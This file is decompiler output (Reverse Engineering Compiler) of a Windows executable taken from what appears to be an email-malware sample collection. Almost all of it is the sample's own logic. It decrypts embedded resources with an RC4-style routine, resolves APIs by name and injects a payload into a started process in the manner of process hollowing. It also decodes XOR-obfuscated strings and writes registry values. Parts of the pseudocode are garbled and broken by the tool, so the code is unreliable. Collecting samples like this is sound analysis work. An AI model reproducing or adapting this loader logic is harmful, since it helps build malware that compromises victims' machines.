/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1817/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401000 - 0x004014BB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{
	/* unknown */ void  Vfffff758;
	/* unknown */ void  Vfffff75c;
	/* unknown */ void  Vfffff760;
	/* unknown */ void  Vfffff764;
	/* unknown */ void  Vfffff768;
	/* unknown */ void  Vfffff78c;
	/* unknown */ void  Vfffff7bc;
	/* unknown */ void  Vfffff9d4;
	/* unknown */ void  Vfffffa34;
	/* unknown */ void  Vfffffab0;
	/* unknown */ void  Vfffffab4;
	/* unknown */ void  Vfffffac4;
	/* unknown */ void  Vfffffac8;
	/* unknown */ void  Vfffffacc;
	/* unknown */ void  Vfffffad0;
	/* unknown */ void  Vfffffad4;
	/* unknown */ void  Vfffffad8;
	/* unknown */ void  Vfffffadc;
	/* unknown */ void  Vfffffae0;
	/* unknown */ void  Vfffffaec;
	/* unknown */ void  Vfffffaf4;
	/* unknown */ void  Vfffffafc;
	/* unknown */ void  Vfffffb00;
	/* unknown */ void  Vfffffb08;
	/* unknown */ void  Vfffffb20;
	/* unknown */ void  Vfffffb2c;
	/* unknown */ void  Vfffffb30;
	/* unknown */ void  Vfffffb3c;
	/* unknown */ void  Vfffffb40;
	/* unknown */ void  Vfffffb48;
	/* unknown */ void  Vfffffb4c;
	/* unknown */ void  Vfffffb58;
	/* unknown */ void  Vfffffb5c;
	/* unknown */ void  Vfffffb68;
	/* unknown */ void  Vfffffbf0;



    (save)ebp;
    ebp = esp;
    esp = esp & -16;
    esp = esp - 2112;
    (save)0;
    esi = *__imp__GetModuleHandleA();
    edi = *(esi + 60);
    edx = *(esi + edi + 6) & 65535;
    ebx = edi + esi + 248;
    if(edx > 0) {
        *esp = edi;
        edi = edx;
        Vfffff7bc = esi;
        esi = 0;
        do {
            if(L004018F0(ebx, 4203056, 6) == 0) {
                break;
            }
            esi = esi + 1;
            ebx = ebx + 40;
        } while(esi < edi);
        edi = *esp;
        esi = Vfffff7bc;
    }
    (save) & Vfffffbf0;
    (save)4;
    (save)4096;
    (save)esi;
    *__imp__VirtualProtect();
    (save)4203072;
    (save)311;
    *(esi + edi + 136) = *(ebx + 12);
    (save)esi;
    *(esi + edi + 140) = *(ebx + 8);
    edi = *__imp__FindResourceA();
    (save)edi;
    (save)esi;
    (save) *__imp__LoadResource();
    ebx = *__imp__LockResource();
    (save)edi;
    (save)esi;
    Vfffff78c = *__imp__SizeofResource();
    (save)4203072;
    (save)312;
    (save)0;
    esi = *__imp__FindResourceA();
    (save)esi;
    (save)0;
    edi = *__imp__SizeofResource();
    (save)esi;
    (save)0;
    (save) *__imp__LoadResource();
    esi = *__imp__LockResource();
    L00401550();
    (save)260;
    (save) & Vfffffa34;
    (save)0;
    *__imp__GetModuleFileNameA();
    asm("o16 movq mm1,[0x4020c0]");
    asm("o16 movq mm0,[0x4020d0]");
    eax = 0;
    do {
        asm("o16 movq [esp+eax*4+0x440],mm0");
        asm("o16 paddd mm0,mm1");
        asm("o16 movq [esp+eax*4+0x450],mm0");
        asm("o16 paddd mm0,mm1");
        asm("o16 movq [esp+eax*4+0x460],mm0");
        asm("o16 paddd mm0,mm1");
        asm("o16 movq [esp+eax*4+0x470],mm0");
        asm("o16 paddd mm0,mm1");
        eax = eax + 16;
    } while(eax < 256);
    Vfffff768 = esi;
    Vfffff764 = edi;
    *esp = ebx;
    ecx = 0;
    esi = 0;
    do {
        ebx = *(esp + esi * 4 + 1088);
        ecx = ecx + ebx;
        eax = esi;
        edx = 0;
        if(!(ecx = ecx + ( *(Vfffff764 / Vfffff764 % Vfffff764 / Vfffff764 + Vfffff768) & 255) & -2147483393)) {
            ecx = (ecx - 1 | -256) + 1;
        }
        eax = *(esp + ecx * 4 + 1088);
        *(esp + esi * 4 + 1088) = eax;
        ebx = bl & 255;
        esi = esi + 1;
        *(esp + ecx * 4 + 1088) = ebx;
    } while(esi < 256);
    ebx = *esp;
    edx = esi;
    if(Vfffff760 > 0) {
        *esp = ebx;
        esi = 0;
        edi = ebx;
        do {
            if(!(edx = edx + 1 & -2147483393)) {
                edx = (edx - 1 | -256) + 1;
            }
            if(!(ecx = ecx + *(esp + edx * 4 + 1088) & -2147483393)) {
                ecx = (ecx - 1 | -256) + 1;
            }
            *(esp + edx * 4 + 1088) = *(esp + ecx * 4 + 1088);
            eax = *edi & 255;
            ebx = bl & 255;
            *(esp + ecx * 4 + 1088) = ebx;
            if(!(ebx = *(esp + ecx * 4 + 1088) + *(esp + edx * 4 + 1088) & -2147483393)) {
                ebx = (ebx - 1 | -256) + 1;
            }
            eax = eax ^ *(esp + ebx * 4 + 1088);
            *edi = al;
            edi = edi + 1;
            esi = esi + 1;
        } while(esi < Vfffff760);
        ebx = *esp;
    }
    asm("o16 pxor mm0,mm0");
    asm("Unknown opcode 0x0f");
    Vfffffb2c = Vfffffb2c - eax;
    asm("Unknown opcode 0x0f");
    Vfffffb3c = Vfffffb3c - eax;
    asm("Unknown opcode 0x0f");
    Vfffffb4c = Vfffffb4c - eax;
    asm("Unknown opcode 0x0f");
    Vfffffb5c = Vfffffb5c - eax;
    asm("o16 movd [esp+0x410],mm0");
    Vfffffb2c = 68;
    *L00403010 = ebx;
    *esp = 65543;
    if(( *ebx & 65535) == 23117) {
        eax = *(ebx + 60) + ebx;
        *L0040300C = eax;
        if(*eax == 17744) {
            (save)4202884;
            (save)4202900;
            (save) *__imp__GetModuleHandleA();
            Vfffffb68 = *__imp__GetProcAddress();
            (save)4202916;
            (save)4202928;
            (save) *__imp__GetModuleHandleA();
            Vfffffb58 = *__imp__GetProcAddress();
            (save)4202884;
            (save)4202952;
            (save) *__imp__GetModuleHandleA();
            Vfffffb5c = *__imp__GetProcAddress();
            (save)4202884;
            (save)4202968;
            (save) *__imp__GetModuleHandleA();
            Vfffffb48 = *__imp__GetProcAddress();
            (save)4202884;
            (save)4202988;
            (save) *__imp__GetModuleHandleA();
            Vfffffb40 = *__imp__GetProcAddress();
            (save)4202884;
            (save)4203008;
            (save) *__imp__GetModuleHandleA();
            esi = *__imp__GetProcAddress();
            (save)4202884;
            (save)4203028;
            (save) *__imp__GetModuleHandleA();
            edi = *__imp__GetProcAddress();
            (save) & Vfffffb30;
            (save) & Vfffffad8;
            (save)0;
            (save)0;
            (save)4;
            (save)0;
            (save)0;
            (save)0;
            (save) & Vfffff9d4;
            (save)0;
            Vfffffb20();
            (save) *( *L0040300C + 52);
            (save)Vfffffb08;
            Vfffffaf4();
            eax = *L0040300C;
            (save)64;
            (save)12288;
            (save) *(eax + 80);
            (save) *(eax + 52);
            (save)Vfffffb00;
            Vfffffafc();
            eax = *L0040300C;
            (save)0;
            (save) *(eax + 84);
            (save)ebx;
            (save) *(eax + 52);
            (save)Vfffffaec;
            Vfffffae0();
            eax = *L0040300C;
            if(( *(eax + 6) & 65535) > 0) {
                Vfffffac4 = edi;
                edi = Vfffffacc;
                Vfffffac8 = esi;
                esi = 0;
                do {
                    (save)0;
                    edx = esi + esi * 4;
                    edx = *( *L00403010 + 60) + ebx + 248 + edx * 8;
                    (save) *(edx + 16);
                    ecx = *(edx + 12) + *(eax + 52);
                    *L00403008 = edx;
                    (save) *(edx + 20) + ebx;
                    (save)ecx;
                    (save)Vfffffad8;
                    *edi();
                    eax = *L0040300C;
                    ecx = *(eax + 6) & 65535;
                    esi = esi + 1;
                } while(esi < ecx);
                edi = Vfffffab0;
                esi = Vfffffab4;
            }
            ebx = esp;
            (save)ebx;
            (save)Vfffffadc;
            Vfffffad0();
            eax = *L0040300C;
            Vfffff758 = *(eax + 52) + *(eax + 40);
            (save)ebx;
            (save)Vfffffad4;
            *esi();
            (save)Vfffffacc;
            *edi();
        }
    }
    (save)15000;
    *__imp__Sleep();
    (save)0;
    *__imp__ExitProcess();
    eax = Vfffff758;
    edx = Vfffff75c;
    ecx = Vfffff760;
}

stack space not deallocated on return
/*	Procedure: 0x004014BC - 0x00401541
 *	Argument size: 28
 *	Local size: 140
 *	Save regs size: 12
 */

L004014BC(A118, A11c, A120, A130)
/* unknown */ void  A118;
/* unknown */ void  A11c;
/* unknown */ void  A120;
/* unknown */ void  A130;
{
	/* unknown */ void  ebx;
	/* unknown */ void  ebp;
	/* unknown */ void  edi;



    ebp = edx;
    edi = esp;
    *__imp__wsprintfA(edi, 4202832, eax, ecx);
    (save) & A120;
    ebx = 0;
    (save) & A11c;
    (save)0;
    (save)983103;
    (save)0;
    (save)0;
    (save)0;
    (save)edi;
    (save)-2147483647;
    eax = *__imp__RegCreateKeyExA();
    if(eax == 0) {
        A118 = ebx;
        *__imp__RegSetValueExA();
        eax = *__imp__RegCloseKey(A11c, A130, ebp, ebx, 4, & A118, 4);
    }
}

/*	Procedure: 0x00401542 - 0x0040154F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401542()
{



}

/*	Procedure: 0x00401550 - 0x004018EF
 *	Argument size: 1598
 *	Local size: 0
 *	Save regs size: 0
 */

L00401550(A10, A524, A5a4, A5a8, A5ac, A5b0, A5b4, A5b8, A5bc, A5c0, A5d0, A600, A601, A602, A603, A604, A605, A606, A610, A628, A62a, A630, A648, A64a)
/* unknown */ void  A10;
/* unknown */ void  A524;
/* unknown */ void  A5a4;
/* unknown */ void  A5a8;
/* unknown */ void  A5ac;
/* unknown */ void  A5b0;
/* unknown */ void  A5b4;
/* unknown */ void  A5b8;
/* unknown */ void  A5bc;
/* unknown */ void  A5c0;
/* unknown */ void  A5d0;
/* unknown */ void  A600;
/* unknown */ void  A601;
/* unknown */ void  A602;
/* unknown */ void  A603;
/* unknown */ void  A604;
/* unknown */ void  A605;
/* unknown */ void  A606;
/* unknown */ void  A610;
/* unknown */ void  A628;
/* unknown */ void  A62a;
/* unknown */ void  A630;
/* unknown */ void  A648;
/* unknown */ void  A64a;
{



    esp = esp & -16;
    esp = esp - 1616;
    A600 = *L004020A0;
    edx = *L004020A4 & 65535;
    eax = 48;
    A604 = dx;
    A606 = *L004020A6;
    do {
        *(esp + eax + 1484) = *(eax + 4202604);
        *(esp + eax + 1480) = *(eax + 4202600);
        *(esp + eax + 1476) = *(eax + 4202596);
        *(esp + eax + 1472) = *(eax + 4202592);
    } while(eax = eax - 16);
    A5b0 = *L004020A8;
    A5b4 = *L004020AC;
    A5b8 = *L004020B0;
    A5bc = *L004020B4;
    A5c0 = *L004020B8 & 65535;
    asm("o16 movq mm0,[0x402140]");
    eax = 0;
    do {
        asm("o16 movq mm1,[esp+eax+0x5d0]");
        asm("o16 pxor mm1,mm0");
        asm("o16 movq [esp+eax+0x5d0],mm1");
        eax = eax + 16;
    } while(eax < 48);
    asm("o16 movq mm1,[esp+0x5b0]");
    A600 = A600 ^ 167;
    asm("o16 pxor mm1,mm0");
    asm("o16 movq [esp+0x5b0],mm1");
    A601 = A601 ^ 167;
    A602 = A602 ^ 167;
    A603 = A603 ^ 167;
    A604 = A604 ^ 167;
    A605 = A605 ^ 167;
    A5c0 = A5c0 ^ 167;
    *__imp__wsprintfA( & A10, 4202840, & A5d0, & A5b0);
    eax = A10;
    ecx = & A524;
    edx = & A10;
    if(eax != 0) {
        A5a4 = A5a4;
        A5a8 = A5a8;
        A5ac = A5ac;
        A5ac = edx;
        do {
            asm("Unknown opcode 0x0f");
            *L00402100 = *L00402100 - al;
            asm("Unknown opcode 0x0f");
            A610 = A610 - eax;
            asm("repne umov [0x402110],cl");
            asm("repne umov [esp+0x620],ecx");
            A5ac = A5ac + 1;
            A5a4 = *L00402118 & 65535;
            A628 = si;
            A62a = *L0040211A;
            asm("Unknown opcode 0x0f");
            *L00402120 = *L00402120 - al;
            asm("Unknown opcode 0x0f");
            A630 = A630 - eax;
            asm("repne umov [0x402130],cl");
            asm("repne umov [esp+0x640],ecx");
            A5a4 = *L00402138 & 65535;
            A648 = si;
            A64a = *L0040213A;
            A5a8 = A610;
            A5a4 = & A610;
            if(A5a8 == 0) {
                if(A5a8 == eax) {
                    goto L004018d8;
                }
            } else {
                do {
                    if(A5a8 == eax) {
                        goto L004018d8;
                    }
                    A5a4 = A5a4 + 1;
                    A5a8 = *A5a4;
                } while(A5a8 != 0);
                goto L0040176b;
L004018d8:
                if(A5a4 != 0) {
                    goto L0040176f;
                }
                goto L00401797;
L0040176b:
                if(A5a8 == eax) {
                    goto L0040176f;
                }
            }
L00401797:
            edx = A630;
            A5a4 = & A630;
            if(edx == 0) {
                if(edx == eax) {
                    goto L004018c2;
                }
            } else {
                do {
                    if(edx == eax) {
                        goto L004018c2;
                    }
                    A5a4 = A5a4 + 1;
                    edx = *A5a4;
                } while(edx != 0);
                goto L004017be;
L004018c2:
                if(A5a4 != 0) {
                    goto L004017c2;
L004017be:
                    if(edx == eax) {
L004017c2:
                        A5a8 = & A630;
                        eax = 1321528399;
                        A5a4 = A5a4 - A5a8 + 13;
                        asm("imul esi");
                        eax = A5a4 >> 31;
                        edx = (edx >> 3) - eax;
                        26 = edx * eax;
                        eax = *(A5a4 - eax + A5a8);
                        goto L004017e8;
L0040176f:
                        A5a8 = & A610;
                        eax = 1321528399;
                        A5a4 = A5a4 - A5a8 + 13;
                        asm("imul esi");
                        eax = A5a4 >> 31;
                        edx = (edx >> 3) - eax;
                        26 = edx * eax;
                        eax = *(A5a4 - eax + A5a8);
                    }
                }
            }
L004017e8:
            *ecx = al;
            eax = *A5ac;
            ecx = ecx + 1;
        } while(eax != 0);
    }
    *ecx = 0;
    eax = & A524;
    edx = 4202848;
    ecx = 4202856;
    L004014BC();
    eax = & A524;
    edx = 4202860;
    ecx = 4202868;
    L004014BC();
    eax = & A524;
    edx = 4202848;
    ecx = 4202868;
    L004014BC();
    eax = & A524;
    edx = 4202848;
    ecx = 4202872;
    L004014BC();
    eax = & A524;
    edx = 4202860;
    ecx = 4202876;
    L004014BC();
    eax = & A524;
    edx = 4202848;
    ecx = 4202876;
    L004014BC();
    eax = & A524;
    edx = 4202860;
    ecx = 4202880;
    L004014BC();
    eax = & A524;
    edx = 4202848;
    ecx = 4202880;
    return(L004014BC());
}

/*	Procedure: 0x004018F0 - 0x004019D9
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 12
 */

L004018F0(A10, A14, A18)
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  ebp;
	/* unknown */ void  edi;



    ebp = A10;
    edx = A14;
    if(ebp != edx) {
        ecx = A18;
        if(ecx != 0) {
            eax = ecx >> 2;
            ecx = ecx & 3;
            if(eax > 0) {
                ebx = 0;
                do {
                    if(*(ebp + ebx * 4) != *(edx + ebx * 4)) {
                        goto L0040194b;
                    }
                    ebx = ebx + 1;
                } while(ebx < eax);
            }
            ebx = ebp + eax * 4;
            edx = edx + eax * 4;
            if(ecx != 0) {
                eax = 0;
                do {
                    ebp = *(eax + ebx) & 255;
                    if(ebp != ( *(eax + edx) & 255)) {
                        goto L004019c0;
                    }
                    eax = eax + 1;
                } while(eax < ecx);
            }
        }
    }
    return(0);
L0040194b:
    eax = *(ebp + ebx * 4) & 255;
    if(eax != ( *(edx + ebx * 4) & 255)) {
        eax = 1;
        > ? L00401964 : ;
        eax = -1;
        return;
    }
    eax = *(ebp + ebx * 4 + 1) & 255;
    if(eax != ( *(edx + ebx * 4 + 1) & 255)) {
        eax = 1;
        > ? L00401982 : ;
        eax = -1;
        return;
    }
    eax = *(ebp + ebx * 4 + 2) & 255;
    if(eax != ( *(edx + ebx * 4 + 2) & 255)) {
        eax = 1;
        > ? L004019a0 : ;
        eax = -1;
        return;
    }
    ecx = *(ebp + ebx * 4 + 3) & 255;
    edx = *(edx + ebx * 4 + 3) & 255;
    eax = 1;
    if(ecx <= edx) {
        eax = -1;
    }
    return;
L004019c0:
    ecx = *(eax + ebx) & 255;
    edx = *(eax + edx) & 255;
    eax = 1;
    if(ecx <= edx) {
        eax = -1;
    }
}

/*	Procedure: 0x004019DA - 0x004019DB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004019DA()
{



    esi = esi + -1229539658;
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__entry_point__;
/* 0x00402000       0 */ /* unknown */ void 	__imp__RegSetValueExA;
/* 0x00402004       0 */ /* unknown */ void 	__imp__RegCloseKey;
/* 0x00402008       0 */ /* unknown */ void 	__imp__RegCreateKeyExA;
/* 0x00402010       0 */ /* unknown */ void 	__imp__LockResource;
/* 0x00402014       0 */ /* unknown */ void 	__imp__SizeofResource;
/* 0x00402018       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x0040201c       0 */ /* unknown */ void 	__imp__LoadResource;
/* 0x00402020       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x00402024       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x00402028       0 */ /* unknown */ void 	__imp__FindResourceA;
/* 0x0040202c       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x00402030       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00402034       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x0040203c       0 */ /* unknown */ void 	__imp__wsprintfA;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
